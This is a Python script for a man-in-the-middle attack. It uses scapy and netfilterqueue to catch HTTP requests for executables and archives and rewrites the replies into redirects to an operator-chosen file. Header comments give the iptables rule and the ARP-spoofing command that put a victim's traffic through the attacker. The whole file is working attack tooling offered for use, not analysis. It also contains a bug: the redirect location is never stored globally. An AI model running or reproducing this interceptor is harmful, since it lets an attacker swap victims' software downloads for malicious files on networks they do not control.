import netfilterqueue
import scapy.all as scapy
import optparse

# Redirect outcome packets to a queue: `iptables -I FORWARD -j NFQUEUE --queue-num 0`
# Run ARP spoofing: python3 ARP_spoofing.py --client 192.168.233.140 --access-point 192.168.233.2
# Run File interceptor: python3 file_interceptor.py --port 80 --location https://www.rarlab.com/rar/wrar56b1.exe

port = 80
location = ""
ack_list = []

downloading_request_identifiers =["exe", "zip", "gz", "7z"]

def process_packet(packet):
    global ack_list, location, port

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == port:

            # Capture resource downloading requests.
            for identifier in downloading_request_identifiers:
                if identifier in scapy_packet[scapy.Raw].load.decode():
                    print("Found resource downloading request.")

                    # We capture the ack of the request.
                    ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == port:

            # Check sequence of the response.
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                # Get the response of the resource downloading requests.
                print("Found the response. Replacing the response.")

                # Redirect to another resources.
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(location)
                
                # Delete the length fields, checksum fields in the IP layer and TCP layer.
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                # Set new payload.
                packet.set_payload(bytes(scapy_packet))
                print(scapy_packet.show())

    else:
        # Not handle another requests.
        pass

    # Forward packets to the target.
    packet.accept()


def main():

    global port

    parser = optparse.OptionParser()

    parser.add_option("-p", "--port", dest="port",
                      help="Target port.")

    parser.add_option("-l", "--location", dest="location",
                      help="Redirect location.")

    (options, arguments) = parser.parse_args()

    if options.port:
        port = int(options.port)
    if not options.location:
        parser.error("Please specify a redirect location.")

    location = str(options.location)

    queue = netfilterqueue.NetfilterQueue()

    # Bind to queue number 0.
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    main()
